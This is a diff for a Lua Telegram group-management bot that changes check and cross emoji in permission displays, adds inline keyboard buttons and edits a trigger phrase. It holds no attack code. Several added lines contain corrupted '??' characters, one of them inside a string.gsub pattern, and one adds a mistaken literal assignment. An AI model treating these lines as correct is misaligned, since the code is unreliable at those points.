-invite = '【 ✅ 】' else invite = '【 ❌ 】'
+invite = '【 ✔ 】' else invite = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_pin_messages then
-pin = '【 ✅ 】' else pin = '【 ❌ 】'
+pin = '【 ✔ 】' else pin = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_send_media_messages then
-media = '【 ✅ 】' else media = '【 ❌ 】'
+media = '【 ✔ 】' else media = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_send_messages then
-messges = '【 ✅ 】' else messges = '【 ❌ 】'
+messges = '【 ✔ 】' else messges = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_send_other_messages then
-other = '【 ✅ 】' else other = '【 ❌ 】'
+other = '【 ✔ 】' else other = '【 ✘ 】'
 end
 if Get_Chat.permissions.can_send_polls then
-polls = '【 ✅ 】' else polls = '【 ❌ 】'
+polls = '【 ✔ 】' else polls = '【 ✘ 】'
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
@@ -9388,6 +9388,9 @@ keyboard.inline_keyboard = {
 {
 {text = ban.first_name, url = 't.me/SU_SELVA'}, 
 },
+{
+{text = '𓆩اضف البوت لمجموعتك𓆪', url = 't.me/'..UserBot..'?startgroup=new'},
+},
 }
 local msgg = msg_id/2097152/0.5
 https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo="..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption=".. URL.escape(T).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -9405,6 +9408,9 @@ data = {}
 data.inline_keyboard = {
 {
 {text = ban.first_name, url = 't.me/SU_SELVA'}, 
+},
+{
+{text = '𓆩اضف البوت لمجموعتك𓆪', url = 't.me/'..UserBot..'?startgroup=new'},
 },
 }
 local msgg = msg_id/2097152/0.5
@@ -9529,7 +9535,7 @@ keyboard.inline_keyboard = {
 }
 local msgg = msg_id/2097152/0.5
 https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo="..photo.."&caption=".. URL.escape(Name).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-elseif text == 'بوت تواصل' or text == 'بوت التواصل' or text == 'تواصل السورس' or text == 'تواصل سورس' then
+elseif text == 'بوت تواصل' or text == 'بوت التواصل' or text == 'تواصل السورس' or text == 'التواصل' then
 video = "http://t.me/t_imoo/4"
 local Name = 'بوت تواصل سورس سيلفا '
 keyboard = {} 
@@ -9860,7 +9866,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '- 𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙴𝙻𝚅𝙰 -', url = 't.me/SU_SELVA'}, 
+{text = '- 𝚂𝙾𝚄𝚁𝙲𝙴 ??𝙴𝙻𝚅𝙰 -', url = 't.me/SU_SELVA'}, 
 },
 }
 }
@@ -10328,12 +10334,16 @@ local BotName = {
 'اسمي '..NamesBot..' يا حياتي 🌚❤️',
 'اسمي '..NamesBot..' يوتكه 🙈💔',
 }
+local T = '..ban.first_name..'
 NamesBots = BotName[math.random(#BotName)]
 if photo.total_count > 0 then
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
 {text = NamesBots, url = 't.me/SU_SELVA'}, 
+},
+{
+{text = ban.first_name, url = 't.me/SU_SELVA'}, 
 },
 {
 {text = '𓆩اضف البوت لمجموعتك𓆪', url = 't.me/'..UserBot..'?startgroup=new'},
@@ -10363,6 +10373,7 @@ local BotName = {
 'انا '..NamesBot..' احسن البوتات 🌝💙',
 'نعم 🍒🤍'
 }
+local T = '..ban.first_name..'
 NamesBots = BotName[math.random(#BotName)]
 if photo.total_count > 0 then
 keyboard = {} 
@@ -10371,7 +10382,10 @@ keyboard.inline_keyboard = {
 {text = NamesBots, url = 't.me/SU_SELVA'}, 
 },
 {
-{text = '??اضف البوت لمجموعتك𓆪', url = 't.me/'..UserBot..'?startgroup=new'},
+{text = ban.first_name, url = 't.me/SU_SELVA'}, 
+},
+{
+{text = '𓆩اضف البوت لمجموعتك𓆪', url = 't.me/'..UserBot..'?startgroup=new'},
 },
 }
 msgg = msg.id/2097152/0.5
@@ -11253,7 +11267,7 @@ name = string.gsub(name,"🧖‍♂️","🧖‍♀️🧖‍♀️♀️🧖‍
 name = string.gsub(name,"👬","👭👭👭👭👭👬👭👭👭")
 name = string.gsub(name,"👨‍👨‍👧","👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦??‍👨‍👦")
 name = string.gsub(name,"🕒","🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒")
-name = string.gsub(name,"🕤","🕥🕥🕥🕥🕥🕤🕥🕥🕥")
+name = string.gsub(name,"??","🕥🕥🕥🕥🕥🕤🕥🕥🕥")
 name = string.gsub(name,"⌛️","⏳⏳⏳⏳⏳⏳⌛️⏳⏳")
 name = string.gsub(name,"??","📆📆📆📆📆📆📅📆📆")
 return LuaTele.sendText(msg_chat_id,msg_id,"⎈ ⦙  اسرع واحد يدز الاختلاف ~ {"..name.."}","md",true)  
@@ -12333,7 +12347,7 @@ local TextHelp = [[*
 • المدراء •
 • الادمنيه •
 • المميزين •
-༺┉┉┉⊶﴾𓆩•𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙴𝙻𝚅𝙰•𓆪﴿⊷┉┉┉༻
+༺┉┉┉⊶﴾𓆩•𝚂𝙾??𝚁𝙲𝙴 𝚂𝙴𝙻𝚅𝙰•𓆪﴿⊷┉┉┉༻
 • رفع + تنزيل •
 • مالك •
 • منشئ اساسي •
@@ -13476,11 +13490,11 @@ local UserId = {Text:match('(%d+)/groupNum1//(%d+)')}
 if tonumber(IdUser) == tonumber(UserId[1]) then
 if tonumber(GetAdminsNum(ChatId,UserId[2]).change_info) == 1 then
 LuaTele.answerCallbackQuery(data.id, "⎈ ⦙  تم تعطيل صلاحيه تغيير المعلومات", true)
-GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,'【 ❌ 】',nil,nil,nil,nil,nil)
+GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,'【 ✘ 】',nil,nil,nil,nil,nil)
 LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,0, 0, 0, 0,0,0,1,0})
 else
 LuaTele.answerCallbackQuery(data.id, "⎈ ⦙  تم تفعيل صلاحيه تغيير المعلومات", true)
-GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,'【 ✅ 】',nil,nil,nil,nil,nil)
+GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,'【 ✔ 】',nil,nil,nil,nil,nil)
 LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,1, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
 end
 end
@@ -13490,11 +13504,11 @@ local UserId = {Text:match('(%d+)/groupNum2//(%d+)')}
 if tonumber(IdUser) == tonumber(UserId[1]) then
 if tonumber(GetAdminsNum(ChatId,UserId[2]).pin_messages) == 1 then
 LuaTele.answerCallbackQuery(data.id, "⎈ ⦙  تم تعطيل صلاحيه التثبيت", true)
-GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,'【 ❌ 】',nil,nil,nil,nil)
+GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,'【 ✘ 】',nil,nil,nil,nil)
 LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,0, GetAdminsNum(ChatId,UserId[2]).promote})
 else
 LuaTele.answerCallbackQuery(data.id, "⎈ ⦙  تم تفعيل صلاحيه التثبيت", true)
-GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,'【 ✅ 】',nil,nil,nil,nil)
+GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,'【 ✔ 】',nil,nil,nil,nil)
 LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,1, GetAdminsNum(ChatId,UserId[2]).promote})
 end
 end
@@ -13504,11 +13518,11 @@ local UserId = {Text:match('(%d+)/groupNum3//(%d+)')}
 if tonumber(IdUser) == tonumber(UserId[1]) then
 if tonumber(GetAdminsNum(ChatId,UserId[2]).restrict_members) == 1 then
 LuaTele.answerCallbackQuery(data.id, "⎈ ⦙  تم تعطيل صلاحيه الحظر", true)
-GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,'【 ❌ 】',nil,nil,nil)
+GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,'【 ✘ 】',nil,nil,nil)
 LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, 0 ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
 else
 LuaTele.answerCallbackQuery(data.id, "⎈ ⦙  تم تفعيل صلاحيه الحظر", true)
-GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,'【 ✅ 】',nil,nil,nil)
+GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,'【 ✔ 】',nil,nil,nil)
 LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, 1 ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
 end
 end
@@ -13518,11 +13532,11 @@ local UserId = {Text:match('(%d+)/groupNum4//(%d+)')}
 if tonumber(IdUser) == tonumber(UserId[1]) then
 if tonumber(GetAdminsNum(ChatId,UserId[2]).invite_users) == 1 then
 LuaTele.answerCallbackQuery(data.id, "⎈ ⦙  تم تعطيل صلاحيه دعوه المستخدمين", true)
-GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,'【 ❌ 】',nil,nil)
+GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,'【 ✘ 】',nil,nil)
 LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, 0, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
 else
 LuaTele.answerCallbackQuery(data.id, "⎈ ⦙  تم تفعيل صلاحيه دعوه المستخدمين", true)
-GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,'【 ✅ 】',nil,nil)
+GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,'【 ✔ 】',nil,nil)
 LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, 1, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
 end
 end
@@ -13532,11 +13546,11 @@ local UserId = {Text:match('(%d+)/groupNum5//(%d+)')}
 if tonumber(IdUser) == tonumber(UserId[1]) then
 if tonumber(GetAdminsNum(ChatId,UserId[2]).delete_messages) == 1 then
 LuaTele.answerCallbackQuery(data.id, "⎈ ⦙  تم تعطيل صلاحيه مسح الرسائل", true)
-GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,'【 ❌ 】',nil)
+GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,'【 ✘ 】',nil)
 LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, 0, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
 else
 LuaTele.answerCallbackQuery(data.id, "⎈ ⦙  تم تفعيل صلاحيه مسح الرسائل", true)
-GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,'【 ✅ 】',nil)
+GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,'【 ✔ 】',nil)
 LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, 1, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
 end
 end
@@ -13546,11 +13560,11 @@ local UserId = {Text:match('(%d+)/groupNum6//(%d+)')}
 if tonumber(IdUser) == tonumber(UserId[1]) then
 if tonumber(GetAdminsNum(ChatId,UserId[2]).promote) == 1 then
 LuaTele.answerCallbackQuery(data.id, "⎈ ⦙  تم تعطيل صلاحيه اضافه مشرفين", true)
-GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,nil,'【 ❌ 】')
+GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,nil,'【 ✘ 】')
 LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, 0})
 else
 LuaTele.answerCallbackQuery(data.id, "⎈ ⦙  تم تفعيل صلاحيه اضافه مشرفين", true)
-GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,nil,'【 ✅ 】')
+GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,nil,'【 ✔ 】')
 LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, 1})
 end
 end
@@ -13743,7 +13757,7 @@ end
 if Text and Text:match('(%d+)/NextSeting') then
 local UserId = Text:match('(%d+)/NextSeting')
 if tonumber(IdUser) == tonumber(UserId) then
-local Text = "*\n⎈ ⦙  اعدادات المجموعه ".."\n✅︙علامة صح تعني انا الامر مفتوح".."\n❌︙علامة غلط تعني انا الامر مقفول*"
+local Text = "*\n⎈ ⦙  اعدادات المجموعه ".."\n✔︙علامة صح تعني انا الامر مفتوح".."\n✘︙علامة غلط تعني انا الامر مقفول*"
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
@@ -13803,7 +13817,7 @@ end
 if Text and Text:match('(%d+)/NoNextSeting') then
 local UserId = Text:match('(%d+)/NoNextSeting')
 if tonumber(IdUser) == tonumber(UserId) then
-local Text = "*\n⎈ ⦙  اعدادات المجموعه ".."\n✅︙علامة صح تعني انا الامر مفتوح".."\n❌︙علامة غلط تعني انا الامر مقفول*"
+local Text = "*\n⎈ ⦙  اعدادات المجموعه ".."\n✔︙علامة صح تعني انا الامر مفتوح".."\n✘︙علامة غلط تعني انا الامر مقفول*"
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
